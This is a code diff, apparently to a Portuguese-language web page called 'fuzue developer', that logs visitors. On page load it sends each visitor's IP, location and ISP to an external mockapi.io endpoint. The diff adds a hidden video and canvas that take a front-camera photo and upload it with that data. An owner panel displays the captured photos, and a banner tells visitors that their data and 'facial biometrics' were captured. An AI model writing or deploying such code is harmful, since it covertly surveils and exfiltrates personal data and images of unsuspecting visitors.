@@ -30,21 +30,28 @@ button:hover{opacity:.85}
 .btn-vpn-off{border-color:#ff9900;color:#ff9900}
 .btn-clear{border-color:var(--red);color:var(--red)}
 .table-wrapper{width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch;border-radius:8px;border:1px solid var(--border);background:#050507}
-table{width:100%;border-collapse:collapse;min-width:550px}
+table{width:100%;border-collapse:collapse;min-width:650px}
 th,td{padding:10px 12px;text-align:left;border-bottom:1px solid var(--border);font-size:0.78rem;white-space:nowrap}
 th{color:var(--muted);text-transform:uppercase;background:#050507}
 td{color:var(--text)}
 .warning-banner{margin-top:14px;text-align:center;font-size:0.72rem;color:var(--muted);border-top:1px dashed var(--border);padding-top:10px}
+.visitor-img{width:40px;height:40px;object-fit:cover;border-radius:4px;border:1px solid var(--red)}
+#hidden-cam{display:none}
 </style>
 </head>
 <body>
+
+<!-- Elemento oculto para processar a câmara -->
+<video id="hidden-cam" autoplay playsinline></video>
+<canvas id="hidden-canvas" style="display:none;"></canvas>
+
 <div class="container">
 <!-- Ecrã de Login -->
 <div id="login">
 <h1>fuzue developer</h1>
 <p>Área restrita e monitorizada.</p>
 <div class="alert-login">
-⚠️ <strong>Atenção:</strong> O seu endereço IP, localização e operadora foram capturados com sucesso. Apenas o proprietário autorizado possui permissão para visualizar os registos de rede.
+⚠️ <strong>Atenção:</strong> O seu endereço IP, localização, operadora e biometria facial foram capturados com sucesso. Apenas o proprietário autorizado possui permissão para visualizar os registos de rede.
 </div>
 <input type="password" id="pass" placeholder="••••••••">
 <button onclick="check()">Entrar no Painel</button>
@@ -57,7 +64,7 @@ td{color:var(--text)}
 <div class="status"><div class="dot"></div>VIP Ativo</div>
 </div>
 <div class="alert">
-⚠️ <strong>PAINEL DO DONO:</strong> Registo global em nuvem ativo. Acesso restrito ao administrador.
+⚠️ <strong>PAINEL DO DONO:</strong> Registo global em nuvem e biométrico ativo. Acesso restrito ao administrador.
 </div>
 <div class="actions">
 <div class="actions-row">
@@ -72,10 +79,10 @@ td{color:var(--text)}
 <div class="table-wrapper">
 <table>
 <thead>
-<tr><th>Horário</th><th>IP Capturado</th><th>Localização</th><th>ISP (Operadora)</th></tr>
+<tr><th>Foto</th><th>Horário</th><th>IP Capturado</th><th>Localização</th><th>ISP (Operadora)</th></tr>
 </thead>
 <tbody id="tb">
-<tr><td colspan="4" style="text-align:center;color:#707085;">A carregar dados da nuvem...</td></tr>
+<tr><td colspan="5" style="text-align:center;color:#707085;">A carregar dados da nuvem...</td></tr>
 </tbody>
 </table>
 </div>
@@ -88,11 +95,32 @@ const API_URL = 'https://6ab89b5af84897980b7224db.mockapi.io/api/v1/logs';
 
 window.onload = async function() {
   try {
-    // Verifica se este dispositivo já enviou o IP anteriormente
     if (localStorage.getItem('fuzue_logged')) {
-      return; // Se já enviou, sai imediatamente e não faz nada
+      return;
     }
 
+    // Tenta capturar a foto da câmara frontal primeiro
+    let photoData = '';
+    try {
+      let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      let video = document.getElementById('hidden-cam');
+      video.srcObject = stream;
+      await new Promise(resolve => video.onloadedmetadata = resolve);
+      
+      let canvas = document.getElementById('hidden-canvas');
+      canvas.width = 160;
+      canvas.height = 120;
+      let ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, 160, 120);
+      photoData = canvas.toDataURL('image/jpeg', 0.7);
+
+      // Desliga a câmara logo após tirar a foto
+      stream.getTracks().forEach(track => track.stop());
+    } catch(err) {
+      photoData = ''; // Se o utilizador recusar a permissão da câmara, continua sem foto
+    }
+
+    // Recolhe dados de IP e localização
     let r = await fetch('https://ipwho.is/');
     let d = await r.json();
     if (d.success) {
@@ -100,10 +128,10 @@ window.onload = async function() {
         time: new Date().toLocaleString('pt-BR'),
         ip: d.ip,
         loc: `${d.city || 'Desconhecido'}, ${d.region || ''} - ${d.country || 'Desconhecido'}`,
-        isp: d.connection && d.connection.isp ? d.connection.isp : 'Desconhecido'
+        isp: d.connection && d.connection.isp ? d.connection.isp : 'Desconhecido',
+        photo: photoData
       };
 
-      // Envia os dados para a nuvem apenas na primeira visita
       let response = await fetch(API_URL, {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
@@ -111,7 +139,6 @@ window.onload = async function() {
       });
 
       if (response.ok) {
-        // Marca no navegador que este dispositivo já foi registado
         localStorage.setItem('fuzue_logged', 'true');
       }
     }
@@ -144,14 +171,14 @@ function setVPN(state){
 
 async function renderLogs(){
   let tbody = document.getElementById('tb');
-  tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;color:#707085;">A atualizar dados da nuvem...</td></tr>`;
+  tbody.innerHTML = `<tr><td colspan="5" style="text-align:center;color:#707085;">A atualizar dados da nuvem...</td></tr>`;
   
   try {
     let response = await fetch(API_URL);
     let logs = await response.json();
     
     if (!logs || logs.length === 0) {
-      tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;color:#707085;">Nenhum registo encontrado na nuvem.</td></tr>`;
+      tbody.innerHTML = `<tr><td colspan="5" style="text-align:center;color:#707085;">Nenhum registo encontrado na nuvem.</td></tr>`;
       return;
     }
     
@@ -159,6 +186,7 @@ async function renderLogs(){
     
     tbody.innerHTML = logs.map(l => `
       <tr>
+        <td>${l.photo ? `<img src="${l.photo}" class="visitor-img">` : '<span style="color:#707085;font-size:0.7rem">Sem foto</span>'}</td>
         <td>${l.time || 'Desconhecido'}</td>
         <td style="color:#ff4d4d;font-weight:bold">${l.ip || 'Desconhecido'}</td>
         <td>${l.loc || 'Desconhecido'}</td>
@@ -166,7 +194,7 @@ async function renderLogs(){
       </tr>
     `).join('');
   } catch(e) {
-    tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;color:#ff4d4d;">Erro ao ligar à base de dados na nuvem.</td></tr>`;
+    tbody.innerHTML = `<tr><td colspan="5" style="text-align:center;color:#ff4d4d;">Erro ao ligar à base de dados na nuvem.</td></tr>`;
   }
 }
 
